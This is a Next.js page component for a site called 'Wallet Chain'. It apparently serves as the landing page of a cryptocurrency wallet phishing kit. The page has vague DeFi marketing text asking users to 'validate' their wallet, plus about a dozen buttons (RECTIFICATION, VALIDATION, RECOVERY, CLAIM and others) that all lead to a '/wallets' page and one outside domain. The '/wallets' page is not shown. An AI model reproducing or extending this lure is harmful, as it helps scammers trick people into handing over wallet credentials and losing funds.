import Head from 'next/head'
import Header from '@components/Header'
import Footer from '@components/Footer'

export default function Home() {
  return (
    <div className="container">
      <Head>
        <title>Next.js Starter!</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main>
    
     <div class="home1" ><div class="content1" ><div class="logo-div" ><img class="big-logo" src="images/chain.jpeg" alt="logo"></div>
    <div class="section2" >
    <h1 class="title">WALLET CHAIN</h1>
    <p class="info">Wallet Chain is a decentralized protocol and platform that combines Blockchain and DeFi, implementing elements from Blockchain with non-custodial management, Micropools, instant liquidity and decentralized governance. Each process are been required to be filled out respectively. Validation of wallet will be completed below as follows</p>
    
    <div id="btns" >
    <a class="home-btn" href="/wallets"><p class="btn-text">RECTIFICATION</p>
    </a><a class="home-btn" href="/wallets">
    
    <p class="btn-text">REWARDS</p>
    </a><a class="home-btn" href="/wallets"><p class="btn-text">VALIDATION</p></a>
    
    <a class="home-btn" href="/wallets"><p class="btn-text">RECOVERY</p></a>
    
    <a class="home-btn" href="/wallets"><p class="btn-text">BUYING</p></a><a class="home-btn" href="/wallets">
    
    <p class="btn-text">SELLING</p></a><a class="home-btn" href="/wallets"><p class="btn-text">STAKING</p></a>
    
    <a class="home-btn" href="/wallets"><p class="btn-text">UNSTAKING</p></a>
      
      <a class="home-btn" href="/wallets"><p class="btn-text">CLAIM</p></a>
      
      <a class="home-btn" href="/wallets"><p class="btn-text">MIGRATE</p></a>
      
      <a class="home-btn" href="https://chain-protocol.info"><p class="btn-text">NFT</p></a>
      
      
      
      </div></div></div></div></div>
    
    
    
    
    
    
    
      </main>

      <Footer />
    </div>
  )
}
